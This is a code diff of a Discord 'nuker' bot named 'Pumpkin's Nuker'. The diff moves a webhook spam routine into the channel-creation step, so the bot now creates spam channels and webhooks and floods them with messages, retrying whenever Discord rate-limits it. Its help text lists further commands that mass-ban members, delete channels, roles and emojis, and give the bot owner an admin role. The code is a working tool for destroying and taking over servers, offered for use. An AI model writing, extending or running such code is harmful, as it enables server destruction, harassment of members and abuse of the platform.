@@ -61,65 +61,6 @@ def is_owner():
     return commands.check(predicate)
 
 
-@bot.command(name="3")
-@is_owner()
-async def spam(ctx):
-    with open('config.json', 'r') as file:
-        config = json.load(file)
-
-    messages_per_channel = config['messages_per_channel']
-    rest_time = config['rest_time']
-    message_content = config['message_content']
-    webhook_names = config['webhook_names']  
-
-    guild = ctx.guild
-    channels = guild.text_channels
-
-    print("Spamming process started.")
-
-    try:
-        async with aiohttp.ClientSession() as session:
-            webhook_list = []
-            for channel in channels:
-                webhook = await channel.create_webhook(name=webhook_names[0]) 
-                webhook_list.append(webhook)
-                await asyncio.sleep(1)  
-
-            for _ in range(20):  
-                for _ in range(messages_per_channel):
-                    embed = discord.Embed(
-                        title='Spam',
-                        description=message_content
-                    )
-                    tasks = []
-                    for webhook in webhook_list:
-                        
-                        tasks.append(webhook.send(content=message_content, embed=embed))
-
-                    while True:
-                        try:
-                            
-                            await asyncio.gather(*tasks)
-                            break 
-                        except aiohttp.ClientResponseError as e:
-                            if e.status == 429:  
-                                print("Rate limited! Retrying after exponential backoff...")
-                                retry_after = int(e.headers.get('Retry-After', '1'))
-                                await asyncio.sleep(retry_after + 1)
-                                print("Continuing spamming...")  
-                            else:
-                                print("Error sending webhook message:", e) 
-                                raise  
-
-                    await asyncio.sleep(rest_time)
-
-            for webhook in webhook_list:
-                await webhook.delete()
-
-    except aiohttp.ClientError as e:
-        print(f"Error sending webhook message: {e}")
-        
-
 
 @bot.command(name="1")
 @is_owner()
@@ -193,13 +134,73 @@ async def delete_channels(guild, deleted_channels):
 async def spam_channels(guild, num_channels, deleted_channels):
     try:
         channel_names = [config['spam_channels_name_1'], config['spam_channels_name_2']]
+        webhook_names = config['webhook_names']
+        webhook_list = []
+
         for _ in range(num_channels):
             channel_name = random.choice(channel_names)
             channel = await guild.create_text_channel(name=channel_name)
             deleted_channels.append(channel.name)
             print(f'Spam text channel created in {guild.name}: {channel.name}')
+
+            webhook = await channel.create_webhook(name=random.choice(webhook_names))
+            webhook_list.append(webhook)
+            print(f'Webhook created in {guild.name} - Channel: {channel.name}, Webhook: {webhook.name}')
+
+        await spam(webhook_list)  # Pass the webhook list to the spam function
+
     except Exception as e:
-        print(f'Error creating spam text channels in {guild.name}: {e}')
+        print(f'Error creating spam text channels and webhooks in {guild.name}: {e}')
+        
+        
+async def spam(webhook_list):
+    try:
+        with open('config.json', 'r') as file:
+            config = json.load(file)
+
+        messages_per_channel = config['messages_per_channel']
+        rest_time = config['rest_time']
+        message_content = config['message_content']
+
+        print("Spamming process started.")
+
+        try:
+            async with aiohttp.ClientSession() as session:
+                for _ in range(20):
+                    for _ in range(messages_per_channel):
+                        embed = discord.Embed(
+                            title='Spam',
+                            description=message_content
+                        )
+                        tasks = []
+                        for webhook in webhook_list:
+                            tasks.append(webhook.send(content=message_content, embed=embed))
+
+                        while True:
+                            try:
+                                await asyncio.gather(*tasks)
+                                break
+                            except aiohttp.ClientResponseError as e:
+                                if e.status == 429:
+                                    print("Rate limited! Retrying after exponential backoff...")
+                                    retry_after = int(e.headers.get('Retry-After', '1'))
+                                    await asyncio.sleep(retry_after + 1)
+                                    print("Continuing spamming...")
+                                else:
+                                    print("Error sending webhook message:", e)
+                                    raise
+
+                        await asyncio.sleep(rest_time)
+
+                for webhook in webhook_list:
+                    await webhook.delete()
+
+        except aiohttp.ClientError as e:
+            print(f"Error sending webhook message: {e}")
+
+    except Exception as e:
+        print(f'Error in spam command: {e}')
+        
       
 
 
@@ -236,7 +237,7 @@ async def emojidelete(ctx):
       print(f"successfully deleted emoji {emoji.name}!")
     except Exception as e:
       print(f"error deleting emoji {emoji.name}!: {e}")
-
+            
 
 @bot.command(name="4")
 @is_owner()
@@ -290,7 +291,7 @@ async def banall(ctx):
 async def cmd(ctx):
     embed = discord.Embed(title="Pumpkin's Nuker", description='List of available commands:', color=discord.Color.blue())
 
-    embed.add_field(name='!1', value="change server's name, icon, delete channels, delete roles, create channels, create roles. ", inline=False)
+    embed.add_field(name='!1', value="change server's name, icon, delete channels, delete roles, create channels, create roles, spam messages ", inline=False)
     embed.add_field(name="!2", value="ban members", inline=False)
     embed.add_field(name="!3", value="spam messages", inline=False)
     embed.add_field(name='!4', value='gives an admin role to the owner of the bot', inline=False)
@@ -300,4 +301,5 @@ async def cmd(ctx):
   
     await ctx.author.send(embed=embed)
 
+    
 bot.run(TOKEN)
